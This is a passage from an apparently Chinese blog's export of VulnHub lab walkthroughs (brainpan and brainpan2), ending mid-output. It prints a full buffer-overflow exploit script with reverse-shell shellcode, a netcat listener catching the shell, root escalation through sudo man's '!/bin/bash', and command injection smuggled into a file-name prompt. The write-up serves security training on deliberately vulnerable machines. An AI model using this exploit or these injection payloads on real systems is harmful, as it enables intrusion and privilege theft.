<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.56.115&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\xf3\x12\x17\x31&quot;</span></span><br><span class="line">buf =  b<span class="string">&quot;\x90&quot;</span> * 13</span><br><span class="line">buf += b<span class="string">&quot;\x89\xe5\xd9\xcb\xd9\x75\xf4\x58\x50\x59\x49\x49\x49&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4a\x49\x30\x31\x49\x4b\x5a\x57\x4b\x53\x31\x43\x47&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x33\x46\x33\x53\x5a\x53\x32\x4b\x39\x4b\x51\x38\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x52\x46\x58\x4d\x4d\x50\x4a\x33\x36\x39\x48\x30\x37&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4f\x58\x4d\x4d\x50\x30\x49\x44\x39\x5a\x59\x35\x38&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x50\x59\x38\x30\x38\x45\x36\x32\x48\x44\x42\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x35\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x42\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x56\x30\x36\x31\x30\x53\x4f\x43\x33\x33\x4c\x49\x4b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x51\x38\x4d\x4d\x50\x50\x52\x43\x58\x52\x4e\x46\x4f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x44\x33\x52\x48\x53\x58\x36\x4f\x46\x4f\x32\x42\x53&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x59\x4d\x59\x4a\x43\x31\x42\x31\x43\x4c\x49\x4d\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk + eip + buf</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>使用受害者主机的IP地址和更新的Shellcode更新PoC脚本，在端口443上创建一个新的netcat侦听器，并相应地执行，成功的返回了shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.56.115: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.115] 39737</span><br><span class="line">id</span><br><span class="line">uid=1002(puck) gid=1002(puck) groups=1002(puck)</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">puck@brainpan:/home/puck$ id</span><br><span class="line">id</span><br><span class="line">uid=1002(puck) gid=1002(puck) groups=1002(puck)</span><br><span class="line">puck@brainpan:/home/puck$ whoami</span><br><span class="line">whoami</span><br><span class="line">puck</span><br><span class="line">puck@brainpan:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">checksrv.sh  web</span><br><span class="line">puck@brainpan:/home/puck$</span><br></pre></td></tr></table></figure>

<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>成功！现在，受害者计算机上有一个特权低的shell。继续。查看主目录，看是否有有趣的事情……。不。唯一值得注意的是，有一个脚本可以在死时重新启动Web服务，以及在端口10000上运行的Web服务的根目录。sudo可以使用任何特殊权限吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> puck on this host:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User puck may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /home/anansi/bin/anansi_util</span><br></pre></td></tr></table></figure>

<p>anansi_util NOPASSWD？很有趣。仔细看看。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util</span><br><span class="line">sudo /home/anansi/bin/anansi_util</span><br><span class="line">Usage: /home/anansi/bin/anansi_util [action]</span><br><span class="line">Where [action] is one of:</span><br><span class="line">  - network</span><br><span class="line">  - proclist</span><br><span class="line">  - manual [<span class="built_in">command</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>manual [command]部分。看看是否可以使用root特权运行[command]。</li>
</ul>
<p>成功的提权并找到了flag，吊炸天！！！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util manual /bin/bash</span><br><span class="line">sudo /home/anansi/bin/anansi_util manual /bin/bash</span><br><span class="line">/usr/bin/man: manual-/bin/bash: No such file or directory</span><br><span class="line">/usr/bin/man: manual_/bin/bash: No such file or directory</span><br><span class="line">No manual entry <span class="keyword">for</span> manual</span><br><span class="line">WARNING: terminal is not fully functional</span><br><span class="line">-  (press RETURN)</span><br><span class="line">BASH(1)                                                                BASH(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       bash - GNU Bourne-Again SHell</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       bash [options] [file]</span><br><span class="line"></span><br><span class="line">COPYRIGHT</span><br><span class="line">       Bash is Copyright (C) 1989-2011 by the Free Software Foundation, Inc.</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       Bash  is  an  sh-compatible  <span class="built_in">command</span> language interpreter that executes</span><br><span class="line">       commands <span class="built_in">read</span> from the standard input or from a file.  Bash also incor‐</span><br><span class="line">       porates useful features from the Korn and C shells (ksh and csh).</span><br><span class="line"></span><br><span class="line">       Bash  is  intended  to  be a conformant implementation of the Shell and</span><br><span class="line">       Utilities portion  of  the  IEEE  POSIX  specification  (IEEE  Standard</span><br><span class="line">       1003.1).  Bash can be configured to be POSIX-conformant by default.</span><br><span class="line"></span><br><span class="line">OPTIONS</span><br><span class="line">       All  of  the  single-character shell options documented <span class="keyword">in</span> the descrip‐</span><br><span class="line">       tion of the <span class="built_in">set</span> <span class="built_in">builtin</span> <span class="built_in">command</span> can be used as options when  the  shell</span><br><span class="line"> Manual page bash(1) line 1 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)!/bin/bash</span><br><span class="line">!/bin/bash</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@brainpan:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">b.txt</span><br><span class="line">root@brainpan:~<span class="comment"># cat b.txt</span></span><br><span class="line">cat b.txt</span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                              http://www.techorganic.com </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@brainpan:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>W00T !!!!!root！二进制文件允许以root用户身份查询联机帮助页，因此，可以使用man的内置功能来内联运行命令，例如上述输出中的！/bin/bash。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub198.jpg"></p>
<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
<li>缓冲区溢出</li>
<li>od调试程序</li>
<li>python模糊测试脚本测试段错误</li>
<li>msf脚本生成填充缓冲区的字节</li>
<li>msfvenom生成reverse shell的python shellcode版本的代码</li>
<li>覆盖eip将恶意shellcode代码放入esp取得reverseshell</li>
<li>man内置功能内联运行命令提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan2]</title>
    <url>/2020/02/01/brainpan2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：brainpan：2<br>发行日期：2013年11月20日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjIuemlw">https://download.vulnhub.com/brainpan/brainpan2.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjIuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/brainpan/brainpan2.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">_               _                           ___  </span><br><span class="line">| |             (_)                         |__ \ </span><br><span class="line">| |__  _ __ __ _ _ _ __  _ __   __ _ _ __      ) |</span><br><span class="line">| <span class="string">&#x27;_ \| &#x27;</span>__/ _` | | <span class="string">&#x27;_ \| &#x27;</span>_ \ / _` | <span class="string">&#x27;_ \    / / </span></span><br><span class="line"><span class="string">| |_) | | | (_| | | | | | |_) | (_| | | | |  / /_ </span></span><br><span class="line"><span class="string">|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_| |____|</span></span><br><span class="line"><span class="string">                        | |                       </span></span><br><span class="line"><span class="string">                        |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            by superkojiman  </span></span><br><span class="line"><span class="string">                 http://www.techorganic.com</span></span><br></pre></td></tr></table></figure>

<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>使用此虚拟机，即表示您同意，对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。<br>TL; DR：如果发生坏事，这不是我的错。</p>
<h2 id="设定"><a href="#设定" class="headerlink" title="设定"></a>设定</h2><p>Brainpan已通过测试，可在以下虚拟机管理程序上运行：</p>
<ul>
<li>VMware Player 6.0.1</li>
<li>VMWare Fusion 6.0.2</li>
<li>VirtualBox 4.3.2</li>
</ul>
<p>检查以确保brainpan2.ova具有以下校验和，以便您知道下载的文件是否完整：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5：bf01f03ea0e7cea2553f74189ff35161SHA1：b46891cda684246832f4dbc80ec6e40a997af65a</span><br></pre></td></tr></table></figure>
<p>将brainpan2.ova导入到您首选的管理程序中，并根据需要配置网络设置。<br>它会通过DHCP获得IP地址，建议在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。<br>VulnHub独家.<br><a href="http%EF%BC%9A//blog.vulnhub.com/2013/11/competition-brainpan-2.html">博客文章</a></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.116</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:6D:B8:70 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v -sV -Pn -p- 192.168.56.116</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -v -sV -p 9999,10000 -A -T5 192.168.56.116</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|     _| _|</span><br><span class="line">|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|</span><br><span class="line">|     _|_| _| _| _| _| _| _| _| _| _| _| _|</span><br><span class="line">|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|</span><br><span class="line">|     [______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">|_    LOGIN AS GUEST</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.3</span><br><span class="line">|_http-title: Hacking Trends</span><br></pre></td></tr></table></figure>

<p>nc连接后然后根据具体提示输入命令，发现如下的信息，并能对文件进行一定的操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; GUEST</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; TELL ME MORE</span><br><span class="line">    FILES    HELP    VIEW       CREATE</span><br><span class="line">    USERS    MSG     SYSTEM     BYE</span><br><span class="line"></span><br><span class="line">                          &gt;&gt; FILES</span><br><span class="line">total 36</span><br><span class="line">-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe</span><br><span class="line">-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt</span><br><span class="line">-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt</span><br><span class="line">-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 <span class="built_in">test</span>-1</span><br><span class="line">-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 <span class="built_in">test</span>-2</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt</span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: /etc/passwd</span><br><span class="line">root:x:104:106:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">root :x:0:0:root:/var/root:/bin/bash</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:103::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash</span><br><span class="line">puck:x:1001:1001:puck,,,:/home/puck:/bin/bash</span><br><span class="line">reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>太好了:)可以查看系统内部可以访问的任何文件。从文件列表中，发现uid是系统用户之一。尝试成功创建和读取其主目录中的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                          &gt;&gt; CREATE</span><br><span class="line">    ENTER FILE TO CREATE: /home/anansi/lucifer11   </span><br><span class="line">    ENTER CONTENTS: content\lucifer11testcontents</span><br><span class="line">    FILE CREATED</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: /home/anansi/lucifer11</span><br><span class="line">content\lucifer11testcontents</span><br></pre></td></tr></table></figure>

<p>这意味着可以读取用户获得许可的每个文件，并在可写目录中创建文件。检查了其他命令，但几乎所有命令尚未实现。guest用户不可用的很少。在那一刻，想起了HELP中的一句话引起了我的注意。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AUTHENTICATION</span><br><span class="line">       There is currently no proper authentication mechanism <span class="keyword">in</span> place. At this</span><br><span class="line">       time  the software is <span class="keyword">in</span> it<span class="string">&#x27;s alpha stage. The only avaiable account is</span></span><br><span class="line"><span class="string">       GUEST. The DEBUG account will alter the output of some commands -  use\u2010</span></span><br><span class="line"><span class="string">       ful for developers.</span></span><br></pre></td></tr></table></figure>

<p>提到DEBUG用户。我已从应用程序注销并再次提供“DEBUG”而不是“GUEST”帐户的连接。使用此帐户，可以运行“SYSTEM”命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; DEBUG</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; SYSTEM</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HOME=/home/anansi</span><br><span class="line">COLORTERM=(null)</span><br><span class="line">PWD=/opt/brainpan</span><br><span class="line">PATH=/bin:.:/usr/bin:/sbin</span><br><span class="line">SHLVL=1</span><br></pre></td></tr></table></figure>

<p>在这里停止一下，总结一下已经了解的有关目标的知识：</p>
<ul>
<li>它以单个IP：192.168.57.1​​0运行（在我的情况下）</li>
<li>它有两个开放端口9999和10000</li>
<li>在端口10000上正在运行http服务器（此处无趣）</li>
<li>该http服务器基于Python，这意味着Python已安装并且可以使用</li>
<li>在端口9999上运行某些自定义文件传输</li>
<li>应用自定义应用程序不仅可以在应用程序根目录中提供读取/写入系统中文件的功能</li>
<li>该应用程序在/opt/brainpan中</li>
<li>对DEBUG用户的访问不受限制，因此可以完全访问该应用</li>
<li>从notes.txt中知道应用程序正在使用popen（）查看文件等。</li>
</ul>
<p>可以轻松地将任何文件上传到目标，但无法执行。下一步将是在目标系统上查找远程代码执行。目标是在端口9999上运行的自定义应用程序。在这种情况下，创建程序伪代码是一个好主意。看一下：从popen手册中发现了这一点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">The <span class="built_in">command</span> argument is a pointer to a null-terminated string containing a shell <span class="built_in">command</span> line. This <span class="built_in">command</span> is passed to /bin/sh using the -c flag; interpretation, <span class="keyword">if</span> any, is performed by the shell.</span><br></pre></td></tr></table></figure>

<p>命令参数是指向以空结束的字符串的指针，该字符串包含shell命令行。使用-c标志将该命令传递给/bin/sh；解释（如果有）由shell执行。</p>
<p>意味着可以使用popen（）执行多个命令，唯一需要的就是将命令注入其中。在popen（）中可能使用用户输入的唯一两个命令是VIEW和CREATE。从VIEW开始：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                          &gt;&gt; VIEW  </span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt; <span class="built_in">echo</span> <span class="string">&quot;some unexpected text lucifer11&quot;</span>;           </span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">some unexpected text lucifer11</span><br><span class="line"></span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt; ifconfig;</span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 08:00:27:6d:b8:70  </span><br><span class="line">          inet addr:192.168.56.116  Bcast:192.168.56.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::a00:27ff:fe6d:b870/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:213 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:152 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:20390 (19.9 KiB)  TX bytes:19237 (18.7 KiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet 